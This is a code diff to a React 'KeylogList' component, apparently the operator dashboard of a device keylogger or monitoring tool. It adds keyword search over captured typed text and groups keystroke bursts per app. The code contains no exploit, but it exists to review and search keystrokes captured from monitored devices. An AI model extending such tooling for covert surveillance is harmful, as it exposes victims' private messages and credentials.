@@ -1,7 +1,7 @@
-import React, { useState, useEffect, useCallback } from 'react';
+import React, { useState, useEffect, useCallback, useMemo } from 'react';
 import { useAuthContext } from '../context/AuthContext';
 import dataService from '../services/dataService';
-import { Keyboard, Clock, ChevronDown, Filter } from 'lucide-react';
+import { Keyboard, Clock, ChevronDown, Filter, Search, X } from 'lucide-react';
 
 const PAGE_SIZE = 100;
 
@@ -12,6 +12,7 @@ function KeylogList({ deviceId }) {
   const [isLoading, setIsLoading] = useState(false);
   const [initialLoading, setInitialLoading] = useState(true);
   const [selectedApp, setSelectedApp] = useState('All');
+  const [searchQuery, setSearchQuery] = useState('');
 
   const formatTime = (timestamp) => {
     const date = new Date(timestamp < 10000000000 ? timestamp * 1000 : timestamp);
@@ -39,14 +40,52 @@ function KeylogList({ deviceId }) {
       setHasMore(true);
       setInitialLoading(true);
       setSelectedApp('All');
+      setSearchQuery('');
       fetchKeylogs(0, false);
     }
   }, [deviceId, token, fetchKeylogs]);
 
   const loadMore = () => fetchKeylogs(keylogs.length, true);
 
-  const uniqueApps = ['All', ...new Set(keylogs.map(k => k.package_name).filter(Boolean))];
-  const filteredKeylogs = selectedApp === 'All' ? keylogs : keylogs.filter(k => k.package_name === selectedApp);
+  const consolidateKeylogs = (logs) => {
+    if (!logs || logs.length === 0) return [];
+    const sorted = [...logs].sort((a, b) => a.timestamp - b.timestamp);
+    const sessions = [];
+    for (const log of sorted) {
+      const lastSession = sessions[sessions.length - 1];
+      if (lastSession) {
+        const lastEntry = lastSession[lastSession.length - 1];
+        const timeDiff = log.timestamp - lastEntry.timestamp;
+        if (lastEntry.package_name === log.package_name && timeDiff <= 3000) {
+          lastSession.push(log);
+          continue;
+        }
+      }
+      sessions.push([log]);
+    }
+    return sessions.map(session =>
+      session.reduce((longest, curr) =>
+        curr.typed_text.length >= longest.typed_text.length ? curr : longest
+      )
+    );
+  };
+
+  const consolidatedKeylogs = useMemo(() => consolidateKeylogs(keylogs), [keylogs]);
+
+  const uniqueApps = ['All', ...new Set(consolidatedKeylogs.map(k => k.package_name).filter(Boolean))];
+
+  let filteredKeylogs = selectedApp === 'All'
+    ? consolidatedKeylogs
+    : consolidatedKeylogs.filter(k => k.package_name === selectedApp);
+
+  if (searchQuery.trim()) {
+    const q = searchQuery.toLowerCase().trim();
+    filteredKeylogs = filteredKeylogs.filter(k =>
+      (k.app_name || '').toLowerCase().includes(q) ||
+      (k.package_name || '').toLowerCase().includes(q) ||
+      (k.typed_text || '').toLowerCase().includes(q)
+    );
+  }
 
   return (
     <div className="bg-white rounded-3xl shadow-sm border border-slate-200 overflow-hidden animate-in fade-in duration-500">
@@ -61,17 +100,37 @@ function KeylogList({ deviceId }) {
           </div>
         </div>
         {!initialLoading && keylogs.length > 0 && (
-          <div className="flex items-center gap-2">
-            <Filter className="w-4 h-4 text-slate-400" />
-            <select
-              value={selectedApp}
-              onChange={(e) => setSelectedApp(e.target.value)}
-              className="px-4 py-2 bg-slate-50 border border-slate-200 rounded-xl text-sm font-bold text-slate-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
-            >
-              {uniqueApps.map(app => (
-                <option key={app} value={app}>{app === 'All' ? 'All Apps' : app}</option>
-              ))}
-            </select>
+          <div className="flex items-center gap-3 flex-wrap">
+            <div className="flex items-center gap-2">
+              <Search className="w-4 h-4 text-slate-400" />
+              <input
+                type="text"
+                value={searchQuery}
+                onChange={(e) => setSearchQuery(e.target.value)}
+                placeholder="Search keywords..."
+                className="px-4 py-2 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-700 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent w-48"
+              />
+              {searchQuery && (
+                <button
+                  onClick={() => setSearchQuery('')}
+                  className="p-1.5 text-slate-400 hover:text-slate-600 hover:bg-slate-100 rounded-lg transition-colors"
+                >
+                  <X className="w-4 h-4" />
+                </button>
+              )}
+            </div>
+            <div className="flex items-center gap-2">
+              <Filter className="w-4 h-4 text-slate-400" />
+              <select
+                value={selectedApp}
+                onChange={(e) => setSelectedApp(e.target.value)}
+                className="px-4 py-2 bg-slate-50 border border-slate-200 rounded-xl text-sm font-bold text-slate-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
+              >
+                {uniqueApps.map(app => (
+                  <option key={app} value={app}>{app === 'All' ? 'All Apps' : app}</option>
+                ))}
+              </select>
+            </div>
           </div>
         )}
       </div>
@@ -84,7 +143,11 @@ function KeylogList({ deviceId }) {
         <div className="p-20 text-center text-slate-400">
           <Keyboard className="w-12 h-12 mx-auto mb-4 opacity-20" />
           <p className="font-bold tracking-widest text-xs uppercase">
-            {selectedApp === 'All' ? 'No keystrokes recorded yet' : 'No keystrokes for this app'}
+            {searchQuery.trim()
+              ? 'No keystrokes match your search'
+              : selectedApp === 'All'
+                ? 'No keystrokes recorded yet'
+                : 'No keystrokes for this app'}
           </p>
         </div>
       ) : (
